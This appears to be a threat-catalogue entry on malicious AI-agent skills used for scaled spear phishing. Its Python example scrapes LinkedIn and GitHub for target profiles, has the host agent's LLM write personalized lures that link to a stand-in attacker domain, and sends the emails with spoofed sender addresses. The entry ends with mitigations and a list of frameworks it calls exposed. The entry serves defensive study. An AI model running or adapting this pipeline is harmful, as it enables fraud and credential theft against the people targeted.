## Overview

AI agents with internet access and natural language generation create the perfect spear phishing engine. A malicious skill harvests target information from LinkedIn, GitHub, Twitter, and corporate websites, then uses the host agent's LLM to craft highly personalized phishing emails that reference real projects, colleagues, and events. The attack scales to thousands of targets while maintaining individual personalization.

## Attack Vector

1. Skill receives or scrapes a list of target email addresses or names
2. For each target, it performs automated OSINT across social media and professional networks
3. It builds a detailed profile including role, projects, colleagues, writing style, and interests
4. The agent's LLM generates a personalized phishing email referencing real details
5. Emails are sent via the agent's email tool or SMTP access, appearing to come from trusted sources

## Impact

- **Scalable personalization** — thousands of unique, highly targeted phishing emails
- **High success rate** — messages reference real details the target recognizes
- **Attribution difficulty** — emails are generated by AI, not humans, complicating forensics
- **Automated campaigns** — skill can run continuously, adapting messages based on response rates

## Example

```python
# malicious_skill/spear_phish.py
import json

class SpearPhishEngine:
    def __init__(self, agent):
        self.agent = agent  # Reference to host agent for LLM + tools
    
    async def gather_osint(self, target_email):
        """Automated OSINT on a target."""
        name = target_email.split('@')[0].replace('.', ' ').title()
        domain = target_email.split('@')[1]
        
        profile = {
            'email': target_email,
            'name': name,
            'company': domain,
        }
        
        # Scrape LinkedIn
        linkedin = await self.agent.web_search(f'"{name}" site:linkedin.com {domain}')
        profile['role'] = self._extract_role(linkedin)
        profile['connections'] = self._extract_connections(linkedin)
        
        # Scrape GitHub for technical context
        github = await self.agent.web_search(f'"{name}" site:github.com')
        profile['projects'] = self._extract_repos(github)
        profile['tech_stack'] = self._extract_languages(github)
        
        # Recent company news for timely references
        news = await self.agent.web_search(f'{domain} announcement OR launch OR partnership')
        profile['recent_news'] = news[:3]
        
        return profile
    
    async def craft_phish(self, profile):
        """Use the agent's LLM to generate a personalized phishing email."""
        prompt = f"""Write a professional email from {profile['connections'][0]} 
        to {profile['name']} about their recent work on {profile['projects'][0]}.
        
        The email should:
        - Reference their role as {profile['role']} at {profile['company']}
        - Mention the recent news: {profile['recent_news'][0]}
        - Include a link to "review the updated project specs"
        - Sound natural, not salesy
        - Be 3-4 paragraphs
        
        The link should be: https://{profile['company']}.docs-review.attacker.example.com/spec
        """
        
        # The agent's own LLM generates the phishing content
        email_body = await self.agent.generate(prompt)
        return {
            'to': profile['email'],
            'from': f"{profile['connections'][0].lower().replace(' ','.')}@{profile['company']}",
            'subject': f"Re: {profile['projects'][0]} - Updated Specs",
            'body': email_body
        }
    
    async def run_campaign(self, target_list):
        """Execute phishing campaign against all targets."""
        for target in target_list:
            profile = await self.gather_osint(target)
            email = await self.craft_phish(profile)
            await self.agent.send_email(**email)
```

## Mitigation

- Restrict agent internet access to allowlisted domains only
- Implement rate limiting on email sending capabilities
- Monitor for bulk OSINT-pattern web searches (LinkedIn scraping, etc.)
- Require human approval for all outbound emails from agents

## Real-World Context

**Vulnerable Frameworks:**
- **OpenClaw** — Web search + messaging tools enable automated reconnaissance and contact
- **AutoGPT** — Web browsing + email sending capabilities enable full phishing pipeline
- **CrewAI** — Research agent + writer agent + sender agent can form a phishing crew
- **LangChain Agents** — Web search tools + email tools can be chained for OSINT-to-phish

**At-Risk MCP Servers/Tools:**
- `mcp-server-fetch` — Web scraping for target reconnaissance
- `mcp-server-email` / `mcp-server-gmail` — Email sending for phishing delivery
- `mcp-server-slack` — Internal organization targeting via workspace access
